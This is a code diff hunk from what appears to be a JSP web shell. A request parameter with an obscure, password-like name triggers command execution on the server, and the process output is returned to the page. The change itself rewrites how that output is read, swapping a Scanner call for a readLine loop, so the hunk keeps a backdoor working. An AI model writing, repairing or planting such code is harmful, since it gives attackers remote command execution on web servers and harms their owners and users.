@@ -11,10 +11,11 @@ if (request.getParameter("cmd_cuA44dZ@xS2@!x") != null) {
   OutputStream os = p.getOutputStream();
   InputStream in = p.getInputStream();
   DataInputStream dis = new DataInputStream(in);
-  try (Scanner scanner = new Scanner(dis)) {
-		res = scanner.useDelimiter("\\A").next();
-	}
-  
+  String disr = dis.readLine();
+  while ( disr != null ) {
+	res = res + disr; 
+	disr = dis.readLine();
+    }
  }
  
 pageContext.setAttribute("result", res);
